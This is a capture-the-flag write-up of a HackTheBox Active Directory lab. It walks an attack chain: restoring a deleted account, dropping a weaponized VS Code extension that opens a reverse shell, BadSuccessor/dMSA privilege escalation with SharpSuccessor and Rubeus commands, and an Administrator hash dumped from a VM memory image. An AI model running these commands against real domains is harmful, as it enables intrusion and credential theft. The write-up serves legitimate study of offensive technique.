---
layout: post
title: "Checkpoint"
date: 2026-07-01 00:00:00 -0700
categories: challenges
description: Assume-breach AD chain — recycle-bin restore, a malicious VS Code extension for foothold, BadSuccessor/dMSA privilege escalation, and credential recovery from a VM memory snapshot.
parent: HackTheBox - Season 11
grand_parent: Challenges
event: "htb-season-11"
tags:
  - "HackTheBox"
  - "Windows"
  - "ActiveDirectory"
  - "assume-breach"
  - "ADWS"
  - "recycle-bin"
  - "vscode-extension"
  - "BadSuccessor"
  - "dMSA"
  - "shadow-credentials"
  - "lsass"
  - "T1078.001"
  - "T1110.003"
  - "T1176.002"
  - "T1098"
  - "T1003.001"
  - "T1550.003"
---
# Checkpoint

## Engagement Notes

Checkpoint is an assume-breach Active Directory box: the engagement starts with
valid credentials (`alex.turner` / `Checkpoint2024!`) and the whole challenge is
the chain. It's long and it rewards enumeration over tooling — every pivot came from
noticing an artifact (an open ADWS port, a writable deleted object, a share named
for `.vsix` packages, a Server 2025 DC) and then researching what that artifact
made possible.

The chain: restore a deleted account from the AD Recycle Bin → drop a malicious VS
Code extension to get a shell → abuse the brand-new **BadSuccessor / dMSA**
primitive to reach a privileged context → and finally recover the Administrator
hash from an **LSASS memory image** sitting in a backup share. Two techniques here
(the .vsix foothold and BadSuccessor) were opportunistic bets that paid off, and
they're documented the way they actually happened rather than as a clean plan.

## Attack path

1. **Recon as `alex.turner`** → SMB shares (`DevDrop` readable, `VMBackups` denied); enumerate the domain over **ADWS** with SOAPy/soaphound; `bloodyAD get writable` shows write access to a **deleted** object, *Mark Davies*.
2. **AD Recycle Bin restore** → restore *Mark Davies*; the password is reused, so `mark.davies` is now live and can write to `DevDrop`.
3. **Malicious VS Code extension** → upload a weaponized `.vsix` to `DevDrop`; it auto-activates in a VS Code instance running as **`ryan.brooks`** → reverse shell + `user.txt`.
4. **Dead-ends as `ryan.brooks`** → targeted Kerberoasting (nothing usable) and Whisker shadow-credentials (PKINIT unsupported on the DC).
5. **BadSuccessor / dMSA** → DC01 is Server 2025 and `ryan.brooks` has `CREATE_CHILD` on `OU=DMSAHolder`; weaponize a dMSA and mint Kerberos tickets impersonating a privileged account.
6. **Loot `VMBackups`** → now reachable; a `.vmem` memory snapshot yields the **Administrator** NT hash via `vmkatz` → domain takeover.

## Enumeration — `alex.turner`

Assume-breach start, so straight into domain enumeration. SMB first:

```console
$ smbclient //checkpoint.htb/DevDrop -U 'checkpoint.htb/alex.turner'%'Checkpoint2024!'
smb: \> ls
  .                                   D        0  Tue May 26 14:45:01 2026
  ..                                  D        0  Sat May  9 07:42:27 2026
# VMBackups → NT_STATUS_ACCESS_DENIED
```

`DevDrop`'s share comment is a lead in itself: *"VS Code extensions share for
approved .vsix packages compatible with VS Code engine 1.118.0."* `VMBackups` is
denied — note it for later.

Directory enumeration went through **ADWS** (Active Directory Web Services)
with [SOAPy](https://github.com/logangoins/SOAPy) and
[soaphound](https://github.com/FalconForceTeam/SOAPHound) rather than classic LDAP:

```console
$ python artifacts/SOAPy/src/soa.py checkpoint.htb/alex.turner:'Checkpoint2024!'@checkpoint.htb --users
$ soaphound -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -dc dc01.checkpoint.htb -o ./bloodhounddumps/soaphound_output
```

> 🧠 Honest version: ADWS was the path here **because the port was open and it
> was worth trying something new.** A few attempts with traditional LDAP tooling
> didn't pan out, and once ADWS produced a valid enumeration path the LDAP failure
> went uninvestigated. Trigger to bank: *ADWS (TCP 9389) open → SOAPy is a viable,
> quieter enumeration path when LDAP is uncooperative.*

Then spray the harvested usernames with the one known password — everyone who
reused it falls out — and check what `alex.turner` can actually write:

```console
$ bloodyAD --host checkpoint.htb -d checkpoint -u alex.turner -p 'Checkpoint2024!' get writable --detail
# ... surfaces write access over an object in CN=Deleted Objects — "Mark Davies"
```

## Foothold 1 — AD Recycle Bin restore → `mark.davies`

`bloodyAD get writable` showed write access to a **deleted** object. The newer
bloodyAD lists controlled deleted objects by default (older versions hide them),
so the tombstoned *Mark Davies* was right there. Restore it:

```console
$ bloodyAD --host checkpoint.htb -d checkpoint -u alex.turner -p 'Checkpoint2024!' \
    set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

The password was reused, so `mark.davies` came back live — and crucially, has
**write access to the `DevDrop` share**.

> 🧠 Honest version: the write-to-a-deleted-object was the whole tell, and the
> restore was tried *because it was possible*, not from reasoning out the
> consequence first. The gap worth closing on the next box: state the
> implication explicitly — "write on attribute X of object type Y therefore Z" —
> instead of acting on a raw writable ACL and hoping.

## Foothold 2 — Malicious VS Code extension → `ryan.brooks`

`DevDrop` exists to feed "approved `.vsix` packages" to a VS Code install. A
malicious extension gets built and dropped in:

- `activationEvents: ["*"]` — fires the moment the extension host starts, no user interaction
- `capabilities.untrustedWorkspaces.supported: true` — sidesteps Workspace Trust
- engine `^1.118.0` — the first build targeted `^1.125.0` and the target **rejected it** (`not compatible with VS Code '1.124.2'`), so the floor was lowered to cover the installed version
- payload rewritten from a PowerShell `child_process.exec` beacon to native Node `http`/`net`/`child_process` (no shell dependency)

```console
$ nxc smb checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --share DevDrop --put-file ./payloads/root-0.0.1.vsix root-0.0.1.vsix
```

```console
$ nc -lvn 9999
Connection received on 10.129.26.58 49312
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```

`user.txt` is on ryan's desktop.

> 🧠 No cleverness to claim here: this was **a blind drop.** There was no
> visibility into who consumed the share — a `.vsix` was weaponized, uploaded, and
> left in the hope that something loaded a "blessed" payload. It did. The lesson
> is that a writable extension/plugin/package share is worth a speculative payload
> even with zero confirmation anyone's watching it — the engine-compatibility
> error was the only feedback loop available, and it was enough to tune the build.

## What didn't work (and why)

Two attempts against `svc_deploy` (which `ryan.brooks` can write) went nowhere.
Keeping them because the *why* is the study material:

- **Targeted Kerberoasting** — set a fake SPN on `svc_deploy` with PowerView and
  pulled a `$krb5tgs$` hash. It led nowhere: no crack, no onward path. The
  technique was available but couldn't be weaponized here.
- **Shadow Credentials (Whisker)** — wrote a `msDS-KeyCredentialLink` to
  `svc_deploy`, then Rubeus `asktgt` with the cert failed:

  ```
  [X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP
  ```

  *Why (verified, not observed at the time):* this error on a PKINIT
  shadow-credentials `asktgt` means the KDC has **no certificate with the Smart
  Card Logon EKU** — i.e. the DC isn't configured for PKINIT/certificate
  pre-authentication (no ADCS "Domain Controller Authentication" cert). The
  KeyCredential write succeeds, but the certificate can't be cashed in for a TGT
  via PKINIT. ([Almond OffSec](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html),
  [Rubeus #86](https://github.com/GhostPack/Rubeus/issues/86))

## Privilege escalation — BadSuccessor / dMSA

Enumeration and repeated research kept surfacing **BadSuccessor**: the artifacts
were already visible (a Windows Server 2025 DC, a suspiciously-named
`OU=DMSAHolder`) and the reading pointed straight at it.

```console
PS> BadSuccessor -mode check -domain checkpoint.htb
[!] Windows Server 2025 DCs found. BadSuccessor may be exploitable!
DC01.checkpoint.htb   Windows Server 2025 Standard
```

**BadSuccessor** (CVE-2025-53779, disclosed by Yuval Gordon at Akamai) abuses the
Server 2025 **delegated Managed Service Account (dMSA)** feature: by writing the
`msDS-ManagedAccountPrecededByLink` attribute, a controlled dMSA impersonates a
target account and the KDC issues tickets as that principal
([Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory),
[Unit42](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)).
`ryan.brooks` has `CREATE_CHILD` on `OU=DMSAHolder`, which is exactly what the
attack needs.

Weaponize a dMSA with [SharpSuccessor](https://github.com/logangoins/SharpSuccessor) (@_logangoins):

```console
PS> .\SharpSuccessor.exe add /impersonate:svc_deploy /path:"ou=DMSAHolder,dc=checkpoint,dc=htb" /account:ryan.brooks /name:hacker
[+] Created dMSA object 'CN=hacker' ...
[+] Successfully weaponized dMSA object
```

Then the ticket dance — get ryan's TGT, link the dMSA as the successor, and ask
for a dMSA TGT/TGS that inherits the impersonated account's rights:

```console
PS> ./rubeus.exe tgtdeleg /nowrap                 # ryan's TGT   [+base64 kirbi elided]
$  kt bloodyAD -H dc01.checkpoint.htb -d checkpoint -k set object \
     -v cn=hacker,ou=DMSAHolder,dc=checkpoint,dc=htb svc_deploy msDS-SupersededManagedAccountLink
$  kt bloodyAD -H dc01.checkpoint.htb -d checkpoint -k set object \
     -v 2 svc_deploy msDS-SupersededServiceAccountState
PS> ./rubeus.exe asktgs /targetuser:hacker$ /service:krbtgt/checkpoint.htb /opsec /dmsa /nowrap /ptt /ticket:<tgtdeleg>
PS> ./rubeus.exe asktgs /user:hacker$ /service:CIFS/dc01.checkpoint.htb /opsec /dmsa /nowrap /ptt /ticket:<asktgs>   # +HTTP for WinRM
# [+each /ticket: is a ~2KB base64 blob, elided]
```

That yields service tickets (LDAP/CIFS/HTTP) to DC01 as a privileged context —
enough to WinRM in and, critically, to read the previously-denied `VMBackups`
share.

## Loot — `VMBackups` memory snapshot → Administrator

The dMSA context is **not** domain admin, so DCSync was off the table. But it
could now reach `VMBackups`, which holds a nightly backup of another host —
including a full VM **memory snapshot**:

```console
*Evil-WinRM* PS C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics> ls
    Windows Server 2019-Snapshot1.vmem     2147483648
    Windows Server 2019.vmdk              10199695360
    ...
```

Run `vmkatz` (mimikatz against the `.vmem`) to pull LSASS secrets out of the image:

```console
PS> C:\shares\DevDrop\vmkatz.exe .
  Username: Administrator
  [MSV1_0]
    NT Hash : f29e9c01…be3b
```

That Administrator account **did** have the rights the dMSA context lacked, so
passing the recovered hash completed the takeover.

> 🧠 This is the crux of the box: the foothold user wasn't a domain admin and
> couldn't dump domain secrets directly. The **memory image was the pivot** — the
> lsass contents in a backed-up VM yielded an Administrator credential that *did*
> have the rights. Backup shares are loot: they contain the crown jewels of
> whatever they backed up, at whatever privilege that host held.

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| SOAPy (`soa.py`) | Domain enumeration over ADWS | [github.com/logangoins/SOAPy](https://github.com/logangoins/SOAPy) |
| soaphound | BloodHound collection over ADWS | [github.com/FalconForceTeam/SOAPHound](https://github.com/FalconForceTeam/SOAPHound) |
| bloodyAD | Read/write AD objects; recycle-bin restore; Kerberos-auth writes | [github.com/CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD) |
| netexec (`nxc`) | SMB share access + file drops | [github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) |
| SharpHound / BloodHound | Attack-path graphing | [github.com/SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound) |
| PowerView | Set SPN, targeted Kerberoast attempt | [github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
| Whisker | Shadow-credentials (dead-end) | [github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker) |
| SharpSuccessor | Weaponize dMSA (BadSuccessor) | [github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor) |
| Rubeus | Kerberos ticket requests (`tgtdeleg`, `asktgs /dmsa`) | [github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) |
| VMkatz | Extract LSASS secrets from a `.vmem` image | [github.com/nikaiw/VMkatz](https://github.com/nikaiw/VMkatz) |

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified against its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Valid Accounts: Default Accounts | [T1078.001](https://attack.mitre.org/techniques/T1078/001/) | Assume-breach creds; password reuse across `alex`/`mark` |
| Brute Force: Password Spraying | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Sprayed the one password across all harvested users |
| Software Extensions: IDE Extensions | [T1176.002](https://attack.mitre.org/techniques/T1176/002/) | Malicious `.vsix` auto-executing in VS Code |
| Account Manipulation | [T1098](https://attack.mitre.org/techniques/T1098/) | Recycle-bin restore; `msDS-KeyCredentialLink`; dMSA link attributes |
| OS Credential Dumping: LSASS Memory | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | `vmkatz` over the `.vmem` image |
| Use Alternate Auth Material: Pass the Ticket | [T1550.003](https://attack.mitre.org/techniques/T1550/003/) | Rubeus `/ptt` dMSA tickets to DC01 |

> Targeted **Kerberoasting** is described in the dead-ends above but not tagged —
> it produced a hash that led to no access, so it wasn't part of the successful
> chain.

## Lessons

- **The enumeration pathway is the exploit.** Every pivot on this box came from an
  observed artifact, not a pre-chosen tool. Honoring the *technique* over the
  *tool* is what surfaced `vmkatz` — the need for LSASS out of a memory image came
  first, and the idea found the tool.
- **Backup shares are crown-jewel loot** — a VM memory snapshot carries the LSASS
  secrets of whatever it captured, at that host's privilege level. A non-DA
  foothold that can *read* backups can still reach DA credentials.
- **A writable extension/package share is worth a speculative payload** even with
  no confirmation anyone consumes it (the `.vsix` blind drop).
- **Close the permission→consequence gap explicitly** — "write on attribute X of
  object type Y therefore Z" — instead of acting on a raw writable ACL and hoping.

## Further reading

**Used during the engagement:**
- [The Hidden Risks of Visual Studio Extensions](https://medium.com/@VakninHai/the-hidden-risks-of-visual-studio-extensions-a-new-avenue-for-persistence-attacks-e56722c048f1) — the VS Code extension persistence idea behind the foothold
- [VS Code — Your First Extension](https://code.visualstudio.com/api/get-started/your-first-extension) — extension scaffolding reference

**Reference material (added for study, not consulted during the solve):**
- [BadSuccessor: Abusing dMSA to Escalate Privileges (Akamai)](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) — original disclosure, CVE-2025-53779
- [BadSuccessor attack vector (Unit42)](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [Authenticating with certificates when PKINIT is not supported (Almond)](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html) — the shadow-credentials dead-end

---

*Provenance: commands, outputs, credentials, and flags are transcribed from the
engagement notebook (credential material partially redacted). External facts
(MITRE technique definitions, BadSuccessor/CVE-2025-53779, the PKINIT error
meaning) are linked to their source and were fetched, not recalled.*
